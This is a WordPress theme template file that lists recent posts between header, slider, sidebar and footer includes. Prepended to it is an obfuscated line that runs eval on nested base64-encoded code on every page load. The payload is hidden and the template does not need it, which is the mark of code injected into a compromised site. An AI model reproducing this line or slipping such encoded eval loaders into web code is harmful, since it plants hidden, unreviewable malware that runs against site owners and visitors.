<?php ob_start(); ?>
<?php eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtGcFlXbWhpUTJocFdWaE9iRTVxVW1aYVIxWnFZakpTYkV0R2NGbFhiV2hwVVRKb2NGZFdhRTlpUlRWeFZXMWFZVkl4V25GWmFrcFRZa1YwUm1WRVZsQlNSMmhTVkZSQ1MyUnNhM2RTYmxwVVlsVmFXVll4WXpWWlYwcHpWMnBHV0ZaRk5WUlpNR1JLWlZVMVdGZHRSbGhTTW1nelYxaHdUMVV5Vm5Ka1JWSmhVak5DY2xZd1ZuZGxiR1JGVTI1T2ExWXdXbHBXVm1NeFZFWlZlV1JGZUZKTlYyZzJWWHBDVDFWdFJYbGtSM1JZVWxoQ05sVXhWbEprTVc5M1lraFNhRkpGU25KVk1GWkdUV3hTU1dGNlZtcFdiWGhhVmpJeGIyRXhTWGhYYWxaYVlrVXdlRmxYTVVwbFZURkpWMjF3YVZac2NIbFdSVkpMVXpKR1IyRXpiR3RUUlRWdlZtNXdWMlZXWkhOaFJYQnJWakExU1ZsVmFHdFRiVVoxVkcwMVVrMXRVbmxWTW5SM1UwWlNkRTlWY0ZOU1JVcDFWakZTVDFZeVZsaFRhMlJRVjBWS2NGbHNaRE5rTVUxM1ZHNUtUMDFIZUVWVlZsWXdVa1pXV0dSSVNtRlNWMUo2V2tWYWQxZEZPVlZTYlhSU1RVVlZNVlV4VmxOV2F6UjNZa1ZTVWxaWVVrVldWbVEwWTFad1IyRkZkR3BOVjJRMlZrY3hOR0V4U2paaVJFNWhVbFUxZFZsVVJuSmxWbTk2Vkd4S1RsWnNjRlZXYTFaV1RsWldWMWRyWkZCV2JIQlhXVlJPYTJWc1RuSmhSbVJzVmpCd1JWbFljR3RU.YkVaWVQxVjBVazFYVWxCVVZtUlBaRWRXU0ZkdGNFNWlSbXd6VjFkd1QxRXdNVVprUlZKV1lsaENiMVZVVG05U1ZscHpWMnQwVlZac1JqUlZWM2hYVjFVeFZtTkZaRmRoTVhCWVZsUkdVMk14Vm5OVWJFcFhWa1phVmxaWE1UQldNVlYzWlVWV1UxZEZTbEZhVmxaSFZFWkZlRkp1VG1oaVZrcGFWVEkxVDFkVk1IZE9XRTVoVWxkTk1WcEVTbE5TUm05NVpFWndUbUpYVWpaV1ZsSkhWakZWZUZWcldsQldhMXBZVlcxd2MxSldXa1ZSVkVaVi5UVlZ3VjFaSGVGZFdNVXBZWlVVNVZtSkdWVEZXYlhoaFVrZFJlV1JIZEZOTmJtZDNWako0YWs1Vk1WaFZhMUpvWlcxU1MxVldZelZUTVVWNFZHeE9hRTFYZUZwV1Z6RnZVMnhLUlZGdE5WaFdSVFZZV2xaa1MxSXdPVmhsUjNoVFRWWndlRlY2UWs5Vk1rWjBVbXRTYUdWdFVrdFZWRUpIVkVaRmVGSnVUbWhpVmtwYVZUSTFUMWRWTVhKT1dIQmFZV3MxVUZsclZqQlNSbFowWTBkb1VrMXVUWHBWTVZaSFpHeE9jbFJzYUZkaVdFSnZWVzV3YjJKc1RsaGlSazVvVFZkNFdsWlhNVzlUYlVaMVZHdDRVazFYWkROVmVrSTBUbFU1UkU1WGNHaFRSV3gyVkd0U2FtTkZlSE5SYlRWcFRVaE9keTVUTVZKNlMxTnJOeWtwT3cpKTs)); ?>

<?php include('header.php'); ?>

<div id="content" class="inner_container">
	<div id="main_content" class="left">
		<a id="small_banner" href="<?php echo get_page_link(10); ?>"><span class="page_title"><?php echo $lang['emissions']; ?></span></a>
		<?php include('slider.php'); ?>
		
		<?php $the_query = new WP_Query( "cat=3, 4, 5, 6&posts_per_page=5" ); ?>
		<?php while ( $the_query->have_posts() ) : $the_query->the_post(); ?>
            <h4 class="heading uppercase"><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></h4>
            <?php the_excerpt(); ?>
            <a href="<?php the_permalink(); ?>"><?php echo $lang['read more']; ?></a>
            <div class="h_line"></div>
        <?php endwhile; ?>  
        <?php wp_reset_postdata(); ?>
        <a href="<?php echo get_page_link(12); ?>"><?php echo $lang['read all']; ?></a>
	</div>
	
	<?php include('sidebar.php'); ?>
	
	<div class="clear"></div>
</div>

<?php include('footer.php'); ?>